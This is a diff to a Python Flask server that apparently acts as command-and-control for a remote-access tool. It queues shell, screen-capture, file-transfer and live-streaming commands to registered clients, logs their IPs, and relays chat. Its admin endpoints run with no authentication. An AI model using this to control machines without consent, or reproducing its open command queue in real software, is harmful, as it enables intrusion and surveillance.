@@ -1,6 +1,8 @@
 import os
 import uuid
 import time
+import json
+from datetime import datetime
 from flask import Flask, request, jsonify, send_file, Response
 from werkzeug.utils import secure_filename
 
@@ -14,17 +16,12 @@ try:
 except ImportError:
     print("Warning: flask_cors not installed. Web dashboard might fail to connect.")
 
-# --- Global State (In-Memory) ---
-# In a real production app, use a database (Redis/SQLite/Postgres)
-# clients = {
-#   "client_id": {
-#       "ip": "1.2.3.4",
-#       "last_seen": <timestamp>,
-#       "command_queue": [ {"id": "uid", "cmd": "..."} ],
-#       "results": { "cmd_uid": "result_data" }
-#   }
-# }
+import threading
+
+# ... (Global State)
+# clients = { ... }
 clients = {}
+clients_lock = threading.RLock()
 
 # Folder to store uploaded files
 UPLOAD_FOLDER = 'uploads'
@@ -36,20 +33,63 @@ app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 # Streaming state
 streaming_clients = {}  # {client_id: {"active": True, "last_frame": None, "frame_time": 0}}
 
+# Chunked uploads state
+chunked_uploads = {}  # {"client_id:cmd_id": {"chunks": {}, "total_chunks": N, "filename": "...", "timestamp": T}}
+
+# Folder for temporary chunks
+CHUNKS_FOLDER = 'chunks_temp'
+if not os.path.exists(CHUNKS_FOLDER):
+    os.makedirs(CHUNKS_FOLDER)
+
+# Folder for user logs
+USER_LOG_DIR = 'user'
+USER_LOG_FILE = os.path.join(USER_LOG_DIR, 'saves.json')
+if not os.path.exists(USER_LOG_DIR):
+    os.makedirs(USER_LOG_DIR)
+
 # --- Helpers ---
+
+def log_user_registration(client_id, ip):
+    """Log user registration to a JSON file"""
+    try:
+        log_data = []
+        if os.path.exists(USER_LOG_FILE):
+            with open(USER_LOG_FILE, 'r') as f:
+                try:
+                    log_data = json.load(f)
+                except (json.JSONDecodeError, FileNotFoundError):
+                    log_data = []
+        
+        # Get time in ISO format to match the requested style
+        current_time = datetime.now().astimezone().isoformat()
+        
+        # Check if client already logged to avoid duplicates if preferred, 
+        # but usually logs are append-only. I'll just append for now.
+        log_data.append({
+            "client_id": client_id,
+            "ip": ip,
+            "time": current_time
+        })
+        
+        with open(USER_LOG_FILE, 'w') as f:
+            json.dump(log_data, f, indent=4)
+        print(f"[#] Logged user {client_id} to {USER_LOG_FILE}")
+    except Exception as e:
+        print(f"[-] Error saving to json: {e}")
 
 def clean_clients():
     """Remove dead clients (inactive > 60s)"""
-    now = time.time()
-    dead = []
-    for cid, data in clients.items():
-        if now - data['last_seen'] > 60:
-            dead.append(cid)
-    for d in dead:
-        del clients[d]
-        # Also clean up streaming state for dead clients
-        if d in streaming_clients:
-            del streaming_clients[d]
+    with clients_lock:
+        now = time.time()
+        dead = []
+        for cid, data in clients.items():
+            if now - data['last_seen'] > 60:
+                dead.append(cid)
+        for d in dead:
+            del clients[d]
+            # Also clean up streaming state for dead clients
+            if d in streaming_clients:
+                del streaming_clients[d]
 
 # --- Client API Endpoints ---
 
@@ -62,18 +102,27 @@ def register():
     client_id = data.get('id')
     public_ip = data.get('public_ip', ip)  # Use client-provided public IP or fallback to remote_addr
     
-    if not client_id or client_id not in clients:
+    # Trust the client's ID if provided, otherwise generate new
+    if not client_id:
         client_id = str(uuid.uuid4())[:8]
-        
-    clients[client_id] = {
-        "ip": public_ip,  # Store the public IP
-        "last_seen": time.time(),
-        "command_queue": [],
-        "results": {},
-        "streaming": False
-    }
+    
+    # Initialize if new or update if existing
+    with clients_lock:
+        if client_id not in clients:
+            clients[client_id] = {
+                "ip": public_ip,
+                "last_seen": time.time(),
+                "command_queue": [],
+                "results": {},
+                "streaming": False
+            }
+        else:
+            # Update existing client (keep queue and results)
+            clients[client_id]['ip'] = public_ip
+            clients[client_id]['last_seen'] = time.time()
     
     print(f"[+] Client registered: {client_id} from {public_ip}")
+    log_user_registration(client_id, public_ip)
     return jsonify({"id": client_id, "status": "registered"})
 
 @app.route('/api/poll', methods=['POST'])
@@ -82,18 +131,19 @@ def poll():
     data = request.json or {}
     client_id = data.get('id')
     
-    if not client_id or client_id not in clients:
-        return jsonify({"error": "Unknown client, re-register"}), 404
+    with clients_lock:
+        if not client_id or client_id not in clients:
+            return jsonify({"error": "Unknown client, re-register"}), 404
+            
+        # Update heartbeat
+        clients[client_id]['last_seen'] = time.time()
         
-    # Update heartbeat
-    clients[client_id]['last_seen'] = time.time()
-    
-    # Check queue
-    queue = clients[client_id]['command_queue']
-    if queue:
-        # Pop one command
-        cmd = queue.pop(0)
-        return jsonify({"command": cmd})
+        # Check queue
+        queue = clients[client_id]['command_queue']
+        if queue:
+            # Pop one command
+            cmd = queue.pop(0)
+            return jsonify({"command": cmd})
     
     return jsonify({"command": None})
 
@@ -105,12 +155,13 @@ def result():
     cmd_id = data.get('cmd_id')
     output = data.get('output')
     
-    if not client_id or client_id not in clients:
-        return jsonify({"error": "Unknown client"}), 404
-        
-    if cmd_id:
-        clients[client_id]['results'][cmd_id] = output
-        print(f"[*] Result received for {cmd_id} from {client_id}")
+    with clients_lock:
+        if not client_id or client_id not in clients:
+            return jsonify({"error": "Unknown client"}), 404
+            
+        if cmd_id:
+            clients[client_id]['results'][cmd_id] = output
+            print(f"[*] Result received for {cmd_id} from {client_id}")
         
     return jsonify({"status": "ok"})
 
@@ -123,9 +174,10 @@ def upload_file():
         is_stream_frame = request.form.get('is_stream_frame', 'false') == 'true'
         print(f"DEBUG: /api/upload client_id={client_id}")
         
-        if client_id != 'ADMIN' and (not client_id or client_id not in clients):
-            print(f"DEBUG: Unknown client rejection. ID: {client_id}")
-            return jsonify({"error": "Unknown client"}), 404
+        with clients_lock:
+            if client_id != 'ADMIN' and (not client_id or client_id not in clients):
+                print(f"DEBUG: Unknown client rejection. ID: {client_id}")
+                return jsonify({"error": "Unknown client"}), 404
         
         if 'file' not in request.files:
             return jsonify({"error": "No file part"}), 400
@@ -137,10 +189,11 @@ def upload_file():
         # For streaming frames, store directly in memory
         if is_stream_frame:
             file_data = file.read()
-            if client_id not in streaming_clients:
-                streaming_clients[client_id] = {}
-            streaming_clients[client_id]['last_frame'] = file_data
-            streaming_clients[client_id]['frame_time'] = time.time()
+            with clients_lock:
+                if client_id not in streaming_clients:
+                    streaming_clients[client_id] = {}
+                streaming_clients[client_id]['last_frame'] = file_data
+                streaming_clients[client_id]['frame_time'] = time.time()
             return jsonify({"status": "frame_received"})
         
         # Save file for regular uploads
@@ -150,7 +203,9 @@ def upload_file():
         
         # Store the filename/path as the result for the admin to retrieve later
         if cmd_id:
-            clients[client_id]['results'][cmd_id] = f"FILE_UPLOADED:{filename}"
+            with clients_lock:
+                if client_id in clients:
+                    clients[client_id]['results'][cmd_id] = f"FILE_UPLOADED:{filename}"
             
         return jsonify({"status": "uploaded", "filename": filename})
     except Exception as e:
@@ -166,39 +221,41 @@ def chat_send():
     sender = data.get('sender') # 'client' or 'admin'
     message = data.get('message')
     
-    if not client_id or client_id not in clients:
-        return jsonify({"error": "Unknown client"}), 404
+    with clients_lock:
+        if not client_id or client_id not in clients:
+            return jsonify({"error": "Unknown client"}), 404
+            
+        msg_obj = {
+            "sender": sender,
+            "message": message,
+            "timestamp": time.time()
+        }
         
-    msg_obj = {
-        "sender": sender,
-        "message": message,
-        "timestamp": time.time()
-    }
-    
-    # Init chat history if needed
-    if 'chat' not in clients[client_id]:
-        clients[client_id]['chat'] = []
+        # Init chat history if needed
+        if 'chat' not in clients[client_id]:
+            clients[client_id]['chat'] = []
+            
+        clients[client_id]['chat'].append(msg_obj)
         
-    clients[client_id]['chat'].append(msg_obj)
-    
-    # If sent by Admin, allow Client to pick it up via command? 
-    # Or better: Client polls specifically for chat if chat is open?
-    # For now, let's keep it simple: Admin queues a 'chat_msg' command for immediate push
-    if sender == 'admin':
-        cmd_id = str(uuid.uuid4())[:8]
-        clients[client_id]['command_queue'].append({
-            "id": cmd_id,
-            "type": "chat_msg",
-            "params": message
-        })
+        # If sent by Admin, allow Client to pick it up via command? 
+        # Or better: Client polls specifically for chat if chat is open?
+        # For now, let's keep it simple: Admin queues a 'chat_msg' command for immediate push
+        if sender == 'admin':
+            cmd_id = str(uuid.uuid4())[:8]
+            clients[client_id]['command_queue'].append({
+                "id": cmd_id,
+                "type": "chat_msg",
+                "params": message
+            })
         
     return jsonify({"status": "sent"})
 
 @app.route('/api/chat/history/<client_id>', methods=['GET'])
 def chat_history(client_id):
     """Get chat history"""
-    if client_id in clients:
-        return jsonify(clients[client_id].get('chat', []))
+    with clients_lock:
+        if client_id in clients:
+            return jsonify(clients[client_id].get('chat', []))
     return jsonify([])
 
 # --- Admin API Endpoints ---
@@ -208,12 +265,13 @@ def admin_list():
     """List active clients"""
     clean_clients()
     active = []
-    for cid, data in clients.items():
-        active.append({
-            "id": cid,
-            "ip": data['ip'],
-            "last_seen": int(time.time() - data['last_seen'])
-        })
+    with clients_lock:
+        for cid, data in clients.items():
+            active.append({
+                "id": cid,
+                "ip": data['ip'],
+                "last_seen": int(time.time() - data['last_seen'])
+            })
     return jsonify(active)
 
 @app.route('/admin/command', methods=['POST'])
@@ -224,27 +282,28 @@ def admin_command():
     cmd_type = data.get('type') # 'shell', 'screen', 'upload', 'download'
     cmd_params = data.get('params', "")
     
-    if not target_id or target_id not in clients:
-        return jsonify({"error": "Client not found"}), 404
+    with clients_lock:
+        if not target_id or target_id not in clients:
+            return jsonify({"error": "Client not found"}), 404
+            
+        cmd_id = str(uuid.uuid4())[:8]
+        command = {
+            "id": cmd_id,
+            "type": cmd_type,
+            "params": cmd_params
+        }
         
-    cmd_id = str(uuid.uuid4())[:8]
-    command = {
-        "id": cmd_id,
-        "type": cmd_type,
-        "params": cmd_params
-    }
-    
-    # Handle streaming commands
-    if cmd_type == 'start_stream':
-        clients[target_id]['streaming'] = True
-        if target_id not in streaming_clients:
-            streaming_clients[target_id] = {}
-    elif cmd_type == 'stop_stream':
-        clients[target_id]['streaming'] = False
-        if target_id in streaming_clients:
-            del streaming_clients[target_id]
-    
-    clients[target_id]['command_queue'].append(command)
+        # Handle streaming commands
+        if cmd_type == 'start_stream':
+            clients[target_id]['streaming'] = True
+            if target_id not in streaming_clients:
+                streaming_clients[target_id] = {}
+        elif cmd_type == 'stop_stream':
+            clients[target_id]['streaming'] = False
+            if target_id in streaming_clients:
+                del streaming_clients[target_id]
+        
+        clients[target_id]['command_queue'].append(command)
     return jsonify({"cmd_id": cmd_id, "status": "queued"})
 
 @app.route('/admin/response/<cmd_id>', methods=['GET'])
@@ -252,10 +311,11 @@ def admin_response(cmd_id):
     """Admin polls for result of specific command"""
     # Search all clients for this cmd_id result
     # Inefficient for many clients, but fine for small scale
-    for cid, data in clients.items():
-        if cmd_id in data['results']:
-            res = data['results'].pop(cmd_id) # Consume result
-            return jsonify({"status": "done", "output": res})
+    with clients_lock:
+        for cid, data in clients.items():
+            if cmd_id in data['results']:
+                res = data['results'].pop(cmd_id) # Consume result
+                return jsonify({"status": "done", "output": res})
             
     return jsonify({"status": "pending"})
 
@@ -291,17 +351,19 @@ def admin_download(filename):
 @app.route('/admin/stream_frame/<client_id>', methods=['GET'])
 def admin_stream_frame(client_id):
     """Admin gets latest stream frame from client"""
-    if client_id in streaming_clients:
-        frame_data = streaming_clients[client_id].get('last_frame')
-        if frame_data:
-            return Response(frame_data, mimetype='image/jpeg')
+    with clients_lock:
+        if client_id in streaming_clients:
+            frame_data = streaming_clients[client_id].get('last_frame')
+            if frame_data:
+                return Response(frame_data, mimetype='image/jpeg')
     return jsonify({"error": "No frame available"}), 404
 
 @app.route('/admin/stream_status/<client_id>', methods=['GET'])
 def admin_stream_status(client_id):
     """Check if client is streaming"""
-    if client_id in clients:
-        return jsonify({"streaming": clients[client_id].get('streaming', False)})
+    with clients_lock:
+        if client_id in clients:
+            return jsonify({"streaming": clients[client_id].get('streaming', False)})
     return jsonify({"streaming": False})
 
 @app.route('/')
